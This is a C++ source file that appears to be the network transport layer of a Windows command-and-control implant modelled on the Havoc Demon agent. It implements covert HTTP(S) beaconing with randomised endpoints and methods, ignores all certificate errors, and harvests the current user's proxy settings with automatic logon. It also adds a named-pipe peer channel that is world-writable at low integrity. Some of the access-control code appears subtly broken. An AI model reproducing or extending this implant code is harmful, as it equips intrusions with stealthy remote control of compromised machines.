#include <core/include/network.hpp>
using namespace Stream;

namespace Network {
    namespace Http {

        BOOL HttpSendRequest(HINTERNET request, _stream **stream) {

            void *buffer    = { };
            void *download  = { };

            DWORD read   = 0;
            DWORD total  = 0;
            DWORD length = 0;

            do {
                if (!Ctx->win32.WinHttpQueryDataAvailable(request, &length)) {
                    return false;
                }

                if (!buffer) { buffer = Malloc(length + 1); }
                if (!download) { download = Malloc(length + 1); }
                else { download = Realloc(download, total + length + 1); }

                MemSet(buffer, 0, length + 1);
                if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
                    return false;
                }

                MemCopy(B_PTR(download) + total, buffer, read);
                Zerofree(buffer, read);

                total += read;
            } while (length > 0);

            (*stream)           = (_stream*) Malloc(sizeof(_stream));
            (*stream)->buffer   = B_PTR(download);
            (*stream)->length   = total;

            return true;
        }

        VOID DestroyRequestContext(const _request_context *req_ctx) {

            if (req_ctx) {
                if (req_ctx->req_handle)    { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
                if (req_ctx->conn_handle)   { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }

                if (req_ctx->endpoint) {
                    MemSet(req_ctx->endpoint, 0, WcsLength(req_ctx->endpoint) * sizeof(wchar_t));
                    Free(req_ctx->endpoint);
                }
            }
        }

        VOID DestroyProxyContext(const _proxy_context *proxy_ctx) {

            if (proxy_ctx) {
                if (proxy_ctx->proxy_config.lpszProxy)          { Free(proxy_ctx->proxy_config.lpszProxy); }
                if (proxy_ctx->proxy_config.lpszProxyBypass)    { Free(proxy_ctx->proxy_config.lpszProxyBypass); }
                if (proxy_ctx->proxy_config.lpszAutoConfigUrl)  { Free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
            }
        }

        BOOL CreateRequestContext(_request_context *req_ctx) {

            const auto address  = Ctx->transport.http->address;
            const auto port     = Ctx->transport.http->port;

            auto handle = Ctx->transport.http->handle;
            if (!handle) {
                if (!(handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                    return false;
                }
            }

            if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(handle, address, port, 0))) {
                return false;
            }

            const auto method   = Ctx->transport.http->method;
            auto endpoint       = req_ctx->endpoint;
            auto flags          = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

            RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);

            if (Ctx->transport.b_ssl) {
                flags |= WINHTTP_FLAG_SECURE;
            }
            if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, method, endpoint, nullptr, nullptr, nullptr, flags))) {
                return false;
            }

            return true;
        }

        BOOL CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {

            auto proxy_info     = proxy_ctx->proxy_info;
            const auto username = Ctx->transport.http->proxy->username;
            const auto password = Ctx->transport.http->proxy->password;

            if (Ctx->transport.b_proxy) {
                proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;

                if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                    return false;
                }

                if (username && password) {
                    if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, username, WcsLength(username)) ||
                        !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, password, WcsLength(password))) {
                        return false;
                    }
                }
            }
            else if (!Ctx->transport.b_envproxy_check) {
                auto autoproxy = proxy_ctx->autoproxy;

                autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                autoproxy.lpszAutoConfigUrl      = nullptr;
                autoproxy.lpvReserved            = nullptr;
                autoproxy.dwReserved             = 0;
                autoproxy.fAutoLogonIfChallenged = true;

                if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &autoproxy, &proxy_info)) {
                    Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
                    Ctx->transport.env_proxy     = Malloc(Ctx->transport.env_proxylen);

                    MemCopy(Ctx->transport.env_proxy, &proxy_info, Ctx->transport.env_proxylen);
                }
                else {
                    auto proxy_config = proxy_ctx->proxy_config;
                    if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_config)) {

                        if (proxy_config.lpszProxy != nullptr && WcsLength(proxy_config.lpszProxy) != 0) {
                            proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                            proxy_info.lpszProxy         = proxy_config.lpszProxy;
                            proxy_info.lpszProxyBypass   = proxy_config.lpszProxyBypass;

                            Ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
                            Ctx->transport.env_proxy        = Malloc(Ctx->transport.env_proxylen);

                            MemCopy(Ctx->transport.env_proxy, &proxy_info, Ctx->transport.env_proxylen);

                            proxy_config.lpszProxy       = nullptr;
                            proxy_config.lpszProxyBypass = nullptr;
                        }
                        else if (proxy_config.lpszAutoConfigUrl != nullptr && WcsLength(proxy_config.lpszAutoConfigUrl) != 0) {
                            autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                            autoproxy.lpszAutoConfigUrl  = proxy_config.lpszAutoConfigUrl;
                            autoproxy.dwAutoDetectFlags  = 0;

                            Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &autoproxy, &proxy_info);
                            Ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
                            Ctx->transport.env_proxy        = Malloc(Ctx->transport.env_proxylen);

                            MemCopy(Ctx->transport.env_proxy, &proxy_info, Ctx->transport.env_proxylen);
                        }
                    }
                }
                Ctx->transport.b_envproxy_check = true;
            }

            if (Ctx->transport.env_proxy) {
                if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
                    return false;
                }
            }

            return true;
        }

        BOOL HttpCallback(const _stream *const out, _stream **in) {
            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
            // todo: reverting tokens during http operations

            bool success = true;
            _proxy_context proxy_ctx = { };
            _request_context req_ctx = { };

            uint32_t status  = 0;
            DWORD n_status   = sizeof(uint32_t);

            auto ssl_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            wchar_t *methods[] = {
                (wchar_t*)L"GET",
                (wchar_t*)L"POST"
            };

            RANDOM_SELECT(Ctx->transport.http->method, methods);

            if (!CreateRequestContext(&req_ctx) ||
                !CreateProxyContext(&proxy_ctx, &req_ctx)) {
                return false;
            }

            const auto handle = req_ctx.req_handle;
            if (Ctx->transport.b_ssl) {
                x_assertb(Ctx->win32.WinHttpSetOption(handle, WINHTTP_OPTION_SECURITY_FLAGS, &ssl_flags, sizeof(ULONG)));
            }

            if (Ctx->transport.http->headers) {
                wchar_t *header     = nullptr;
                uint32_t n_headers  = 0;

                while (true) {
                    if (!(header = Ctx->transport.http->headers[n_headers])) {
                        break;
                    }

                    x_assertb(Ctx->win32.WinHttpAddRequestHeaders(handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD));
                    n_headers++;
                }
            }

            const auto query = WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER;

            x_assertb(Ctx->win32.WinHttpSendRequest(handle, nullptr, 0, out->buffer, out->length, out->length, 0));
            x_assertb(Ctx->win32.WinHttpReceiveResponse(handle, nullptr));
            x_assertb(Ctx->win32.WinHttpQueryHeaders(handle, query, nullptr, &status, &n_status, nullptr));

            if (status != HTTP_STATUS_OK) {
                return_defer(status);
            }

            x_assertb(HttpSendRequest(req_ctx.req_handle, in));

            defer:
            DestroyRequestContext(&req_ctx);
            DestroyProxyContext(&proxy_ctx);

            return success;
        }
    }

    namespace Smb {

        VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {

            if (SmbSecAttr->sid)        { Ctx->win32.FreeSid(SmbSecAttr->sid); SmbSecAttr->sid = nullptr; }
            if (SmbSecAttr->sid_low)    { Ctx->win32.FreeSid(SmbSecAttr->sid_low); SmbSecAttr->sid_low = nullptr; }
            if (SmbSecAttr->p_acl)      { Free(SmbSecAttr->p_acl); }
            if (SmbSecAttr->sec_desc)   { Free(SmbSecAttr->sec_desc); }
        }

        BOOL SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {

            SID_IDENTIFIER_AUTHORITY sid_auth   = SECURITY_WORLD_SID_AUTHORITY;
            SID_IDENTIFIER_AUTHORITY sid_label  = SECURITY_MANDATORY_LABEL_AUTHORITY;

            PACL acl = { };
            EXPLICIT_ACCESSA access = { };

            MemSet(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
            MemSet(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

            if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
                return false;
            }

            access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
            access.grfInheritance       = NO_INHERITANCE;
            access.grfAccessMode        = SET_ACCESS;

            access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
            access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
            access.Trustee.ptstrName    = (LPSTR) SmbSecAttr->sid;

            uint32_t status = Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl);
            if (status) {
                return false;
            }

            if (!Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low)) {
                return false;
            }

            SmbSecAttr->p_acl = (PACL) Malloc(MAX_PATH);

            if (
                !Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
                !Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low)) {
                return false;
            }

            SmbSecAttr->sec_desc = Malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);

            if (
                !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
                !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE) ||
                !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE)) {
                return false;
            }

            SecAttr->lpSecurityDescriptor = SmbSecAttr->sec_desc;
            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
            SecAttr->bInheritHandle = false;

            return true;
        }

        BOOL PipeRead(void *const handle, const _stream *in) {

            uint32_t read   = 0;
            uint32_t total  = 0;

            do {
                const auto length = __min((in->length - total), PIPE_BUFFER_MAX);

                if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                    if (ntstatus == ERROR_NO_DATA) {
                        return false;
                    }
                }

                total += read;
            }
            while (total < in->length);
            return true;
        }

        BOOL PipeWrite(void *const handle, const _stream *out) {

            uint32_t total = 0;
            uint32_t write = 0;

            do {
                const auto length = __min((out->length - total), PIPE_BUFFER_MAX);

                if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                    return false;
                }

                total += write;
            }
            while (total < out->length);
            return true;
        }

        BOOL PipeSend (_stream *out) {

            SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
            SECURITY_ATTRIBUTES sec_attr    = { };

            if (!Ctx->transport.pipe_handle) {
                if (
                    !SmbContextInit(&smb_sec_attr, &sec_attr) ||
                    !(Ctx->transport.pipe_handle = Ctx->win32.CreateNamedPipeW(Ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                    return false;
                }

                SmbContextDestroy(&smb_sec_attr);

                if (!Ctx->win32.ConnectNamedPipe(Ctx->transport.pipe_handle, nullptr)) {
                    Ctx->nt.NtClose(Ctx->transport.pipe_handle);
                    return false;
                }
            }

            if (!PipeWrite(Ctx->transport.pipe_handle, out)) {
                if (ntstatus == ERROR_NO_DATA) {

                    if (Ctx->transport.pipe_handle) {
                        Ctx->nt.NtClose(Ctx->transport.pipe_handle);
                    }
                    return false;
                }
            }
            return true;
        }

        BOOL PipeReceive(_stream** in) {

            uint32_t peer_id    = 0;
            uint32_t msg_size   = 0;

            DWORD total = 0;
            *in = CreateStream();

            if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, &total, nullptr)) {
                if (total > sizeof(uint32_t) * 2) {

                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), &total, nullptr)) {
                        return false;
                    }
                    if (Ctx->session.peer_id != peer_id) {
                        return false;
                    }
                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), &total, nullptr)) {
                        if (ntstatus != ERROR_MORE_DATA) {
                            return false;
                        }
                    }

                    if (!PipeRead(Ctx->transport.pipe_handle, *in)) {
                        if (*in) {
                            DestroyStream(*in);
                        }
                        return false;
                    }
                }
            }

            return true;
        }
    }
}

